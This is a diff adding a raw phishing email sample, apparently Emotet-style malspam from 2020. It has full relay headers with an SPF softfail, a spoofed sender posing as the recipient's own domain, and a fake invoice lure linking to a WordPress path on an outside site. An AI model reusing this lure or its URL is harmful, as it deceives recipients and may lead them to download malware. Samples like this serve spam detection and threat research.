@@ -1,0 +1,53 @@
+ARC-Authentication-Results: i=1; [removed];
+       spf=softfail ([removed]: domain of transitioning servicepwrbr@noor-international.com does not designate 103.24.96.3 as permitted sender) smtp.mailfrom=Servicepwrbr@noor-international.com
+Return-Path: <Servicepwrbr@noor-international.com>
+Received: from corp.ebonenet.com (corp.ebonenet.com. [103.24.96.3])
+        by [removed] with ESMTP id p15si15400821wrj.426.2020.07.20.13.50.47
+        for [removed];
+        Mon, 20 Jul 2020 13:50:47 -0700 (PDT)
+Received-SPF: softfail ([removed]: domain of transitioning servicepwrbr@noor-international.com does not designate 103.24.96.3 as permitted sender) client-ip=103.24.96.3;
+Authentication-Results: [removed];
+       spf=softfail ([removed]: domain of transitioning servicepwrbr@noor-international.com does not designate 103.24.96.3 as permitted sender) smtp.mailfrom=Servicepwrbr@noor-international.com
+Received: from localhost (localhost [127.0.0.1])
+	by corp.ebonenet.com (Postfix) with ESMTP id 8DD0F2C1762
+	for [removed]; Tue, 21 Jul 2020 01:50:46 +0500 (PKT)
+X-Virus-Scanned: amavisd-new at corp.ebonenet.com
+Received: from corp.ebonenet.com ([127.0.0.1])
+	by localhost (corp.ebonenet.com [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id djNZ6Alo6zPN for [removed];
+	Tue, 21 Jul 2020 01:50:44 +0500 (PKT)
+Received: from mail.noor-international.com (static-234-5-129-150.ebonenet.com [150.129.5.234])
+	by corp.ebonenet.com (Postfix) with ESMTP id E12772C1765
+	for [removed]; Tue, 21 Jul 2020 01:50:44 +0500 (PKT)
+Received: from [190.50.117.177] by mail.noor-international.com (MDaemon PRO v11.0.3)
+	with ESMTP id md50000487257.msg
+	for [removed]; Tue, 21 Jul 2020 01:56:42 +0500
+X-Spam-Processed: mail.noor-international.com, Tue, 21 Jul 2020 01:56:42 +0500
+	(not processed: message from trusted or authenticated source)
+X-Authenticated-Sender: Servicepwrbr@noor-international.com
+X-MDRemoteIP: 190.50.117.177
+X-Return-Path: Servicepwrbr@noor-international.com
+X-Envelope-From: Servicepwrbr@noor-international.com
+X-MDaemon-Deliver-To: [removed]
+Date: Mon, 20 Jul 2020 17:50:34 -0300
+From: "[removed] <[removed]@[removed]>" <Servicepwrbr@noor-international.com>
+To: [removed]
+Subject: INVOICE 120315 from [recipient's email domain]
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+Message-Id: <20200720205046.8DD0F2C1762@corp.ebonenet.com>
+
+<html>
+<body>
+Please see attachment for your scanned document.=0D
+<br>
+<br>
+<a href=3D"http://wmzart.com/wp-includes/pJ/">http://wmzart.com/wp-includes=
+/pJ/</a>
+<br>
+<br>
+<i>[recipient's email domain]</i>
+</body>
+</html>
+
